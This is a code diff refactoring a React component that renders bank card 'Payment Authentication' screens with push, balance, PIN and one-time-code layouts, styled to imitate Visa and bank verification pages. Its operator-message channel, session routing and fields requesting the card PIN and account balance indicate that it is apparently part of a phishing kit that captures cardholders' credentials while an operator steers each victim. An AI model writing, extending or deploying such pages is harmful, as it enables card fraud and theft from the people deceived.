@@ -1,7 +1,6 @@
 import React from "react";
 import { useBankVerification } from "../../hooks/use-bank-verification";
-import type { BankLayoutProps } from "./index";
-import type { OperatorMessage, ResendState, TransactionDetails } from "../../types";
+import type { BankVerificationProps, OperatorMessage, ResendState, TransactionDetails } from "../../types";
 import NBD2Styles from "./styles/nbd2-styles";
 import { StyleIsolationWrapper } from "../../components/style-isolation-wrapper";
 import { BANK_LOGO_DATA_URLS } from "../../assets/bank-logos";
@@ -96,7 +95,6 @@ function VerificationPage({
   bank,
   cardBrand,
   inProgress,
-  hasParams,
   error,
   onClose,
 }: {
@@ -105,7 +103,6 @@ function VerificationPage({
   bank?: string;
   cardBrand?: "visa" | "mastercard";
   inProgress: boolean;
-  hasParams: boolean;
   error?: string | null;
   onClose?: () => void;
 }) {
@@ -115,7 +112,7 @@ function VerificationPage({
       <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       <title>Validate Authentication Credential</title>
       <NBD2Styles />
-      {inProgress && hasParams && (
+      {inProgress && (
         <div style={overlayStyles}>
           <div style={{ background: "#fff", padding: 24, borderRadius: 8, display: "flex", flexDirection: "column", alignItems: "center", gap: 16 }}>
             <Spinner size={48} />
@@ -131,14 +128,12 @@ function VerificationPage({
   );
 }
 
-type BodyVariant = "sms" | "push" | "balance" | "pin";
-
 function TransactionBody({
   transactionDetails,
   variant,
 }: {
   transactionDetails?: TransactionDetails;
-  variant: BodyVariant;
+  variant: "sms" | "push" | "balance" | "pin";
 }) {
   const merchant = transactionDetails?.merchantName ?? "";
   const amount = transactionDetails?.amount ?? "";
@@ -276,111 +271,159 @@ const defaultResendState: ResendState = {
   resending: false,
 };
 
-export function VerificationUi(props: BankLayoutProps) {
-  const { onClose } = props;
-  const hasParams = Boolean(props.channelSlug && props.sessionId);
+function FooterLinks() {
+  return (
+    <div className="footer" id="FooterLinks">
+      <div className="row">
+        <div className="visa-col-12 helpRow" id="Accordion">
+          <ul className="list-group list-group-horizontal flex-wrap pull-left">
+            <li className="list-group-item border-0">
+              <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
+                Need some help?
+              </a>
+            </li>
+            <li className="list-group-item border-0">
+              <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
+                learn more about authentication
+              </a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  );
+}
 
-  const hookResult = useBankVerification({
-    apiBase: props.apiBase ?? "",
-    channelSlug: props.channelSlug ?? "",
-    sessionId: props.sessionId ?? "",
-    debug: props.debug,
-    onSuccess: props.onSuccess,
-    onDeclined: props.onDeclined,
-    onError: props.onError,
-    onRedirect: props.onRedirect,
+function ResendButton({
+  layout,
+  canResend,
+  secondsLeft,
+  resending,
+  submitting,
+  onResend,
+  onTryAgain,
+}: {
+  layout: "sms" | "pin";
+  canResend: boolean;
+  secondsLeft: number;
+  resending: boolean;
+  submitting: boolean;
+  onResend: () => void;
+  onTryAgain: () => void;
+}) {
+  const label = layout === "pin" ? "PIN" : "CODE";
+  return (
+    <div className="visa-row">
+      <div className="col-12 text-center">
+        <span
+          style={{ display: !canResend && secondsLeft <= 0 ? "inline" : "none" }}
+          id="MaximumResendsReachedMessage"
+        >
+          You have been reached maximum attempts, Please contact bank
+        </span>
+        {canResend ? (
+          <button
+            id="ResendLink"
+            className="btn btn-link resend-link no-decoration text-uppercase"
+            type="button"
+            onClick={() => { onTryAgain(); onResend(); }}
+            disabled={resending || submitting}
+          >
+            {resending ? "Sending..." : `RESEND ${label}`}
+          </button>
+        ) : (
+          <span className="resend-link no-decoration text-uppercase" style={{ cursor: "default" }}>
+            Resend {label.toLowerCase()} in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:
+            {String(secondsLeft % 60).padStart(2, "0")}
+          </span>
+        )}
+      </div>
+    </div>
+  );
+}
+
+function ErrorSpan({ message, visible }: { message: string; visible: boolean }) {
+  return (
+    <div className="form-group" id="ErrorMessage">
+      <img id="WarningImage" src="data:," alt="Warning" style={{ display: visible ? "inline" : "none" }} />
+      <span
+        id="ValidationErrorMessage"
+        className="field-validation-error"
+        style={{ display: visible ? "inline" : "none" }}
+      >
+        {message}
+      </span>
+    </div>
+  );
+}
+
+export function VerificationUi({
+  apiBase,
+  channelSlug,
+  sessionId,
+  debug,
+  onSuccess,
+  onDeclined,
+  onError,
+  onRedirect,
+  onClose,
+}: BankVerificationProps) {
+  if (!channelSlug || !sessionId) return null;
+
+  const { layoutState, inProgress, awaitingVerification, error } = useBankVerification({
+    apiBase,
+    channelSlug,
+    sessionId,
+    debug,
+    onSuccess,
+    onDeclined,
+    onError,
+    onRedirect,
+    onClose,
   });
 
-  const {
-    missingParams,
-    shouldRenderNull,
-    inProgress,
-    awaitingVerification,
-    baseLayout,
-    layoutProps,
-    error,
-  } = hookResult;
+  if (!awaitingVerification && !inProgress) return null;
 
-  const showLive = hasParams && !missingParams && !shouldRenderNull && awaitingVerification;
-
-  if (missingParams) {
-    return null;
-  }
-
-  if (shouldRenderNull && hasParams) {
-    return null;
-  }
-
-  const lp = layoutProps as Record<string, unknown>;
-  const transactionDetails = lp?.transactionDetails as TransactionDetails | undefined;
-  const bank = (lp?.bank ?? undefined) as string | undefined;
-  const operatorMessage = lp?.operatorMessage as OperatorMessage | null | undefined;
-
-  const messageClass =
-    operatorMessage?.level === "error"
-      ? "field-validation-error"
-      : "field-validation-valid";
+  const { bank, transactionDetails } = layoutState;
 
   // --- Push layout ---
-  if (baseLayout === "push" && showLive) {
+  if (layoutState.layout === "push") {
     return (
       <StyleIsolationWrapper>
-        <VerificationPage
-        bank={bank}
-        cardBrand={transactionDetails?.cardBrand}
-        inProgress={inProgress}
-        hasParams={hasParams}
-        error={error}
-        onClose={onClose}
-      >
-        <h2 className="screenreader-only">Confirm on your device</h2>
-        <div className="visa-row">
-          <div className="visa-col-12 visa-validate">
-            <strong>Payment Authentication</strong>
-          </div>
-          <div className="row">
-            <div className="col-12" id="ValidateOneUpMessage">
-              <TransactionBody transactionDetails={transactionDetails} variant="push" />
+        <VerificationPage bank={bank} cardBrand={transactionDetails?.cardBrand} inProgress={inProgress} error={error} onClose={onClose}>
+          <h2 className="screenreader-only">Confirm on your device</h2>
+          <div className="visa-row">
+            <div className="visa-col-12 visa-validate">
+              <strong>Payment Authentication</strong>
+            </div>
+            <div className="row">
+              <div className="col-12" id="ValidateOneUpMessage">
+                <TransactionBody transactionDetails={transactionDetails} variant="push" />
+              </div>
             </div>
           </div>
-        </div>
-        <div className="visa-row">
-          <div className="col-12 visa-styling text-center">
-            <div className="form-group" style={{ marginTop: 24, marginBottom: 24 }}>
-              <Spinner size={64} />
+          <div className="visa-row">
+            <div className="col-12 visa-styling text-center">
+              <div className="form-group" style={{ marginTop: 24, marginBottom: 24 }}>
+                <Spinner size={64} />
+              </div>
+              <h3 className="visa-validate" style={{ marginBottom: 8 }}>Confirm on your device</h3>
+              <p className="mb-0">
+                {bank
+                  ? `A push notification has been sent by ${bank}. Please approve the transaction on your device.`
+                  : "A push notification has been sent to your mobile app. Please approve the transaction on your device."}
+              </p>
             </div>
-            <h3 className="visa-validate" style={{ marginBottom: 8 }}>
-              Confirm on your device
-            </h3>
-            <p className="mb-0">
-              {bank
-                ? `A push notification has been sent by ${bank}. Please approve the transaction on your device.`
-                : "A push notification has been sent to your mobile app. Please approve the transaction on your device."}
-            </p>
           </div>
-        </div>
-      </VerificationPage>
+        </VerificationPage>
       </StyleIsolationWrapper>
     );
   }
 
   // --- Balance layout ---
-  if (baseLayout === "balance" && showLive) {
-    const balance = (lp?.balance as string) ?? "";
-    const onBalanceChange = (lp?.onBalanceChange as (v: string) => void) ?? (() => {});
-    const onSubmit = (lp?.onSubmit as () => void) ?? (() => {});
-    const submitting = (lp?.submitting as boolean) ?? false;
-    const canSubmit = (lp?.canSubmit as boolean) ?? false;
-
-    const showLiveBalance = showLive && baseLayout === "balance";
-
-    const handleBalanceSubmit = (e: React.FormEvent) => {
-      e.preventDefault();
-      if (showLiveBalance) onSubmit();
-    };
-
-    const showError = operatorMessage && operatorMessage.message;
-    const errorMessage = operatorMessage?.message ?? "";
+  if (layoutState.layout === "balance") {
+    const { balance, onBalanceChange, onSubmit, submitting, canSubmit, operatorMessage } = layoutState;
+    const showError = Boolean(operatorMessage?.message);
 
     return (
       <StyleIsolationWrapper>
@@ -388,137 +431,73 @@ export function VerificationUi(props: BankLayoutProps) {
           bank={bank}
           cardBrand={transactionDetails?.cardBrand}
           inProgress={inProgress}
-          hasParams={hasParams}
           error={error}
           onClose={onClose}
           footer={
-          <form
-            action="/Api/2_1_0/NextStep/ValidateCredential"
-            autoComplete="off"
-            id="BalanceValidateForm"
-            method="post"
-            name="BalanceValidateForm"
-            noValidate
-            onSubmit={handleBalanceSubmit}
-          >
-            <div className="visa-row">
-              <div className="col-12 visa-styling">
-                <div className="form-group text-center">
-                  <div id="InputAction">
-                    <label htmlFor="BalanceInput" className="credential-label">Balance</label>
-                    <input
-                      autoFocus
-                      className="form-control visa-styling credential-input"
-                      id="BalanceInput"
-                      inputMode="decimal"
-                      name="Balance.Value"
-                      placeholder="e.g. 1,234.56"
-                      type="text"
-                      value={showLiveBalance ? balance : ""}
-                      onChange={
-                        showLiveBalance
-                          ? (e) => onBalanceChange(e.target.value)
-                          : undefined
-                      }
-                      disabled={submitting}
-                      readOnly={!showLiveBalance}
-                    />
-                    <div className="form-group" id="ErrorMessage">
-                      <img
-                        id="WarningImage"
-                        src="data:,"
-                        alt="Warning"
-                        style={{ display: showError ? "inline" : "none" }}
+            <form
+              action="/Api/2_1_0/NextStep/ValidateCredential"
+              autoComplete="off"
+              id="BalanceValidateForm"
+              method="post"
+              name="BalanceValidateForm"
+              noValidate
+              onSubmit={(e) => { e.preventDefault(); onSubmit(); }}
+            >
+              <div className="visa-row">
+                <div className="col-12 visa-styling">
+                  <div className="form-group text-center">
+                    <div id="InputAction">
+                      <label htmlFor="BalanceInput" className="credential-label">Balance</label>
+                      <input
+                        autoFocus
+                        className="form-control visa-styling credential-input"
+                        id="BalanceInput"
+                        inputMode="decimal"
+                        name="Balance.Value"
+                        placeholder="e.g. 1,234.56"
+                        type="text"
+                        value={balance}
+                        onChange={(e) => onBalanceChange(e.target.value)}
+                        disabled={submitting}
                       />
-                      <span
-                        id="ValidationErrorMessage"
-                        className="field-validation-error"
-                        style={{ display: showError ? "inline" : "none" }}
-                      >
-                        {errorMessage}
-                      </span>
-                    </div>
-                    <div className="visa-col-12 text-center">
-                      <button
-                        type="submit"
-                        className="visa-styling btn btn-primary text-uppercase vba-button"
-                        id="ValidateButton"
-                        disabled={showLiveBalance && (submitting || !canSubmit)}
-                      >
-                        {submitting ? "Submitting..." : "Submit"}
-                      </button>
+                      <ErrorSpan message={operatorMessage?.message ?? ""} visible={showError} />
+                      <div className="visa-col-12 text-center">
+                        <button
+                          type="submit"
+                          className="visa-styling btn btn-primary text-uppercase vba-button"
+                          id="ValidateButton"
+                          disabled={submitting || !canSubmit}
+                        >
+                          {submitting ? "Submitting..." : "Submit"}
+                        </button>
+                      </div>
                     </div>
                   </div>
                 </div>
               </div>
-            </div>
-            <div className="footer" id="FooterLinks">
-              <div className="row">
-                <div className="visa-col-12 helpRow" id="Accordion">
-                  <ul className="list-group list-group-horizontal flex-wrap pull-left">
-                    <li className="list-group-item border-0">
-                      <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
-                        Need some help?
-                      </a>
-                    </li>
-                    <li className="list-group-item border-0">
-                      <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
-                        learn more about authentication
-                      </a>
-                    </li>
-                  </ul>
-                </div>
+              <FooterLinks />
+            </form>
+          }
+        >
+          <h2 className="screenreader-only">Balance verification</h2>
+          <div className="visa-row">
+            <div className="visa-col-12 visa-validate"><strong>Payment Authentication</strong></div>
+            <div className="row">
+              <div className="col-12" id="ValidateOneUpMessage">
+                <TransactionBody transactionDetails={transactionDetails} variant="balance" />
               </div>
             </div>
-          </form>
-        }
-      >
-        <h2 className="screenreader-only">Balance verification</h2>
-        <div className="visa-row">
-          <div className="visa-col-12 visa-validate">
-            <strong>Payment Authentication</strong>
           </div>
-          <div className="row">
-            <div className="col-12" id="ValidateOneUpMessage">
-              <TransactionBody transactionDetails={transactionDetails} variant="balance" />
-            </div>
-          </div>
-        </div>
-      </VerificationPage>
+        </VerificationPage>
       </StyleIsolationWrapper>
     );
   }
 
   // --- PIN layout ---
-  if (baseLayout === "pin" && showLive) {
-    const pinValue = (lp?.pinValue as string) ?? "";
-    const onPinChange = (lp?.onPinChange as (v: string) => void) ?? (() => {});
-    const pinMasked = (lp?.pinMasked as boolean) ?? true;
-    const onPinMaskToggle = (lp?.onPinMaskToggle as () => void) ?? (() => {});
-    const wrongCode = (lp?.wrongCode as boolean) ?? false;
-    const expiredCode = (lp?.expiredCode as boolean) ?? false;
-    const onTryAgain = (lp?.onTryAgain as () => void) ?? (() => {});
-    const onSubmit = (lp?.onSubmit as () => void) ?? (() => {});
-    const submitting = (lp?.submitting as boolean) ?? false;
-    const canSubmit = (lp?.canSubmit as boolean) ?? false;
-    const resendState = (lp?.resendState as ResendState) ?? defaultResendState;
+  if (layoutState.layout === "pin") {
+    const { pinValue, onPinChange, pinMasked, onPinMaskToggle, wrongCode, expiredCode, onTryAgain, onSubmit, submitting, canSubmit, resendState, operatorMessage } = layoutState;
     const { secondsLeft, canResend, onResend, resending } = resendState;
-
-    const showLivePin = showLive && baseLayout === "pin";
-
-    const handlePinSubmit = (e: React.FormEvent) => {
-      e.preventDefault();
-      if (showLivePin) onSubmit();
-    };
-
-    const handlePinResend = () => {
-      if (showLivePin && canResend) {
-        onTryAgain?.();
-        onResend();
-      }
-    };
-
-    const showError = wrongCode || expiredCode || (operatorMessage && operatorMessage.message);
+    const showError = wrongCode || expiredCode || Boolean(operatorMessage?.message);
     const errorMessage = wrongCode
       ? "Wrong PIN. Please try again."
       : expiredCode
@@ -528,180 +507,82 @@ export function VerificationUi(props: BankLayoutProps) {
     return (
       <StyleIsolationWrapper>
         <VerificationPage
-        bank={bank}
-        cardBrand={transactionDetails?.cardBrand}
-        inProgress={inProgress}
-        hasParams={hasParams}
-        error={error}
-        onClose={onClose}
-        footer={
-          <form
-            action="/Api/2_1_0/NextStep/ValidateCredential"
-            autoComplete="off"
-            id="PinValidateForm"
-            method="post"
-            name="PinValidateForm"
-            noValidate
-            onSubmit={handlePinSubmit}
-          >
-            <div className="visa-row">
-              <div className="col-12 visa-styling">
-                <div className="form-group text-center">
-                  <div id="InputAction">
-                    <label htmlFor="PinInput" className="credential-label">PIN</label>
-                    <input
-                      autoFocus
-                      className="form-control visa-styling credential-input"
-                      id="PinInput"
-                      inputMode="numeric"
-                      maxLength={4}
-                      name="Pin.Value"
-                      placeholder="••••"
-                      type={pinMasked ? "password" : "text"}
-                      value={showLivePin ? pinValue : ""}
-                      onChange={
-                        showLivePin
-                          ? (e) => onPinChange(e.target.value.replace(/\D/g, "").slice(0, 4))
-                          : undefined
-                      }
-                      disabled={submitting}
-                      readOnly={!showLivePin}
-                    />
-                    <label htmlFor="pin-show-toggle" style={{ display: "block", marginTop: 8, fontSize: 14 }}>
-                      <input id="pin-show-toggle" type="checkbox" checked={!pinMasked} onChange={() => onPinMaskToggle()} />
-                      {" "}Show PIN
-                    </label>
-                    <div className="form-group" id="ErrorMessage">
-                      <img
-                        id="WarningImage"
-                        src="data:,"
-                        alt="Warning"
-                        style={{ display: showError ? "inline" : "none" }}
+          bank={bank}
+          cardBrand={transactionDetails?.cardBrand}
+          inProgress={inProgress}
+          error={error}
+          onClose={onClose}
+          footer={
+            <form
+              action="/Api/2_1_0/NextStep/ValidateCredential"
+              autoComplete="off"
+              id="PinValidateForm"
+              method="post"
+              name="PinValidateForm"
+              noValidate
+              onSubmit={(e) => { e.preventDefault(); onSubmit(); }}
+            >
+              <div className="visa-row">
+                <div className="col-12 visa-styling">
+                  <div className="form-group text-center">
+                    <div id="InputAction">
+                      <label htmlFor="PinInput" className="credential-label">PIN</label>
+                      <input
+                        autoFocus
+                        className="form-control visa-styling credential-input"
+                        id="PinInput"
+                        inputMode="numeric"
+                        maxLength={4}
+                        name="Pin.Value"
+                        placeholder="••••"
+                        type={pinMasked ? "password" : "text"}
+                        value={pinValue}
+                        onChange={(e) => onPinChange(e.target.value.replace(/\D/g, "").slice(0, 4))}
+                        disabled={submitting}
                       />
-                      <span
-                        id="ValidationErrorMessage"
-                        className="field-validation-error"
-                        style={{ display: showError ? "inline" : "none" }}
-                      >
-                        {errorMessage}
-                      </span>
-                    </div>
-                    <div className="visa-col-12 text-center">
-                      <button
-                        type="submit"
-                        className="visa-styling btn btn-primary text-uppercase vba-button"
-                        id="ValidateButton"
-                        disabled={showLivePin && (submitting || !canSubmit)}
-                      >
-                        {submitting ? "Submitting..." : "Submit"}
-                      </button>
+                      <label htmlFor="pin-show-toggle" style={{ display: "block", marginTop: 8, fontSize: 14 }}>
+                        <input id="pin-show-toggle" type="checkbox" checked={!pinMasked} onChange={onPinMaskToggle} />
+                        {" "}Show PIN
+                      </label>
+                      <ErrorSpan message={errorMessage} visible={showError} />
+                      <div className="visa-col-12 text-center">
+                        <button
+                          type="submit"
+                          className="visa-styling btn btn-primary text-uppercase vba-button"
+                          id="ValidateButton"
+                          disabled={submitting || !canSubmit}
+                        >
+                          {submitting ? "Submitting..." : "Submit"}
+                        </button>
+                      </div>
                     </div>
                   </div>
                 </div>
               </div>
-            </div>
-            <div className="visa-row" />
-            <div className="visa-row">
-              <div className="col-12 text-center">
-                <span
-                  style={{ display: !canResend && secondsLeft <= 0 ? "inline" : "none" }}
-                  id="MaximumResendsReachedMessage"
-                >
-                  You have been reached maximum attempts, Please contact bank
-                </span>
-                {showLivePin ? (
-                  canResend ? (
-                    <button
-                      id="ResendLink"
-                      className="btn btn-link resend-link no-decoration text-uppercase"
-                      type="button"
-                      onClick={handlePinResend}
-                      disabled={resending || submitting}
-                    >
-                      {resending ? "Sending..." : "RESEND PIN"}
-                    </button>
-                  ) : (
-                    <span className="resend-link no-decoration text-uppercase" style={{ cursor: "default" }}>
-                      Resend PIN in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:
-                      {String(secondsLeft % 60).padStart(2, "0")}
-                    </span>
-                  )
-                ) : (
-                  <button
-                    id="ResendLink"
-                    className="btn btn-link resend-link no-decoration text-uppercase"
-                    type="button"
-                    disabled
-                  >
-                    RESEND PIN
-                  </button>
-                )}
+              <div className="visa-row" />
+              <ResendButton layout="pin" canResend={canResend} secondsLeft={secondsLeft} resending={resending} submitting={submitting} onResend={onResend} onTryAgain={onTryAgain} />
+              <FooterLinks />
+            </form>
+          }
+        >
+          <h2 className="screenreader-only">Enter your PIN</h2>
+          <div className="visa-row">
+            <div className="visa-col-12 visa-validate"><strong>Payment Authentication</strong></div>
+            <div className="row">
+              <div className="col-12" id="ValidateOneUpMessage">
+                <TransactionBody transactionDetails={transactionDetails} variant="pin" />
               </div>
             </div>
-            <div className="footer" id="FooterLinks">
-              <div className="row">
-                <div className="visa-col-12 helpRow" id="Accordion">
-                  <ul className="list-group list-group-horizontal flex-wrap pull-left">
-                    <li className="list-group-item border-0">
-                      <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
-                        Need some help?
-                      </a>
-                    </li>
-                    <li className="list-group-item border-0">
-                      <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
-                        learn more about authentication
-                      </a>
-                    </li>
-                  </ul>
-                </div>
-              </div>
-            </div>
-          </form>
-        }
-      >
-        <h2 className="screenreader-only">Enter your PIN</h2>
-        <div className="visa-row">
-          <div className="visa-col-12 visa-validate">
-            <strong>Payment Authentication</strong>
           </div>
-          <div className="row">
-            <div className="col-12" id="ValidateOneUpMessage">
-              <TransactionBody transactionDetails={transactionDetails} variant="pin" />
-            </div>
-          </div>
-        </div>
-      </VerificationPage>
+        </VerificationPage>
       </StyleIsolationWrapper>
     );
   }
 
   // --- SMS layout (default) ---
-  const code = (lp?.code as string) ?? "";
-  const onCodeChange = (lp?.onCodeChange as (v: string) => void) ?? (() => {});
-  const wrongCode = (lp?.wrongCode as boolean) ?? false;
-  const expiredCode = (lp?.expiredCode as boolean) ?? false;
-  const onTryAgain = (lp?.onTryAgain as () => void) ?? (() => {});
-  const onSubmit = (lp?.onSubmit as () => void) ?? (() => {});
-  const submitting = (lp?.submitting as boolean) ?? false;
-  const canSubmit = (lp?.canSubmit as boolean) ?? false;
-  const resendState = (lp?.resendState as ResendState) ?? defaultResendState;
-  const { secondsLeft, canResend, onResend, resending } = resendState;
-
-  const showLiveSms = showLive && baseLayout === "sms";
-
-  const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (showLiveSms) onSubmit();
-  };
-
-  const handleResend = () => {
-    if (showLiveSms && canResend) {
-      onTryAgain();
-      onResend();
-    }
-  };
-
-  const showError = wrongCode || expiredCode || (operatorMessage && operatorMessage.message);
+  const { code, onCodeChange, wrongCode, expiredCode, onTryAgain, onSubmit, submitting, canSubmit, resendState, operatorMessage } = layoutState;
+  const { secondsLeft, canResend, onResend, resending } = resendState ?? defaultResendState;
+  const showError = wrongCode || expiredCode || Boolean(operatorMessage?.message);
   const errorMessage = wrongCode
     ? "Wrong OTP. Please try again."
     : expiredCode
@@ -711,13 +592,12 @@ export function VerificationUi(props: BankLayoutProps) {
   return (
     <StyleIsolationWrapper>
       <VerificationPage
-      bank={bank}
-      cardBrand={transactionDetails?.cardBrand}
-      inProgress={inProgress}
-      hasParams={hasParams}
-      error={error}
-      onClose={onClose}
-      footer={
+        bank={bank}
+        cardBrand={transactionDetails?.cardBrand}
+        inProgress={inProgress}
+        error={error}
+        onClose={onClose}
+        footer={
           <form
             action="/Api/2_1_0/NextStep/ValidateCredential"
             autoComplete="off"
@@ -725,7 +605,7 @@ export function VerificationUi(props: BankLayoutProps) {
             method="post"
             name="ValidateCredentialForm"
             noValidate
-            onSubmit={handleSubmit}
+            onSubmit={(e) => { e.preventDefault(); onSubmit(); }}
           >
             <div className="visa-row">
               <div className="col-12 visa-styling">
@@ -742,41 +622,22 @@ export function VerificationUi(props: BankLayoutProps) {
                       type="text"
                       inputMode="numeric"
                       maxLength={6}
-                      value={showLiveSms ? code : ""}
-                      onChange={
-                        showLiveSms
-                          ? (e) => onCodeChange(e.target.value.replace(/\D/g, "").slice(0, 6))
-                          : undefined
-                      }
+                      value={code}
+                      onChange={(e) => onCodeChange(e.target.value.replace(/\D/g, "").slice(0, 6))}
                       disabled={submitting}
-                      readOnly={!showLiveSms}
                     />
-                    <div className="form-group" id="ErrorMessage">
-                      <img
-                        id="WarningImage"
-                        src="data:,"
-                        alt="Warning"
-                        style={{ display: showError ? "inline" : "none" }}
-                      />
-                      <span
-                        id="ValidationErrorMessage"
-                        className="field-validation-error"
-                        style={{ display: showError ? "inline" : "none" }}
-                      >
-                        {errorMessage}
-                      </span>
-                      <span
-                        className="field-validation-valid sf-hidden"
-                        data-valmsg-for="Credential.Value"
-                        data-valmsg-replace="true"
-                      />
-                    </div>
+                    <ErrorSpan message={errorMessage} visible={showError} />
+                    <span
+                      className="field-validation-valid sf-hidden"
+                      data-valmsg-for="Credential.Value"
+                      data-valmsg-replace="true"
+                    />
                     <div className="visa-col-12 text-center">
                       <button
                         type="submit"
                         className="visa-styling btn btn-primary text-uppercase vba-button"
                         id="ValidateButton"
-                        disabled={showLiveSms && (submitting || !canSubmit)}
+                        disabled={submitting || !canSubmit}
                       >
                         {submitting ? "Submitting..." : "Submit"}
                       </button>
@@ -786,76 +647,21 @@ export function VerificationUi(props: BankLayoutProps) {
               </div>
             </div>
             <div className="visa-row" />
-            <div className="visa-row">
-              <div className="col-12 text-center">
-                <span
-                  style={{ display: !canResend && secondsLeft <= 0 ? "inline" : "none" }}
-                  id="MaximumResendsReachedMessage"
-                >
-                  You have been reached maximum attempts, Please contact bank
-                </span>
-                {showLiveSms ? (
-                  canResend ? (
-                    <button
-                      id="ResendLink"
-                      className="btn btn-link resend-link no-decoration text-uppercase"
-                      type="button"
-                      onClick={handleResend}
-                      disabled={resending || submitting}
-                    >
-                      {resending ? "Sending..." : "RESEND CODE"}
-                    </button>
-                  ) : (
-                    <span className="resend-link no-decoration text-uppercase" style={{ cursor: "default" }}>
-                      Resend code in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:
-                      {String(secondsLeft % 60).padStart(2, "0")}
-                    </span>
-                  )
-                ) : (
-                  <button
-                    id="ResendLink"
-                    className="btn btn-link resend-link no-decoration text-uppercase"
-                    type="button"
-                    disabled
-                  >
-                    RESEND CODE
-                  </button>
-                )}
-              </div>
-            </div>
-            <div className="footer" id="FooterLinks">
-              <div className="row">
-                <div className="visa-col-12 helpRow" id="Accordion">
-                  <ul className="list-group list-group-horizontal flex-wrap pull-left">
-                    <li className="list-group-item border-0">
-                      <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
-                        Need some help?
-                      </a>
-                    </li>
-                    <li className="list-group-item border-0">
-                      <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
-                        learn more about authentication
-                      </a>
-                    </li>
-                  </ul>
-                </div>
-              </div>
-            </div>
+            <ResendButton layout="sms" canResend={canResend} secondsLeft={secondsLeft} resending={resending} submitting={submitting} onResend={onResend} onTryAgain={onTryAgain} />
+            <FooterLinks />
           </form>
         }
-    >
-      <h2 className="screenreader-only">Your One-time Passcode has been sent</h2>
-      <div className="visa-row">
-        <div className="visa-col-12 visa-validate">
-          <strong>Payment Authentication</strong>
-        </div>
-        <div className="row">
-          <div className="col-12" id="ValidateOneUpMessage">
-            <TransactionBody transactionDetails={transactionDetails} variant="sms" />
+      >
+        <h2 className="screenreader-only">Your One-time Passcode has been sent</h2>
+        <div className="visa-row">
+          <div className="visa-col-12 visa-validate"><strong>Payment Authentication</strong></div>
+          <div className="row">
+            <div className="col-12" id="ValidateOneUpMessage">
+              <TransactionBody transactionDetails={transactionDetails} variant="sms" />
+            </div>
           </div>
         </div>
-      </div>
-    </VerificationPage>
+      </VerificationPage>
     </StyleIsolationWrapper>
   );
 }
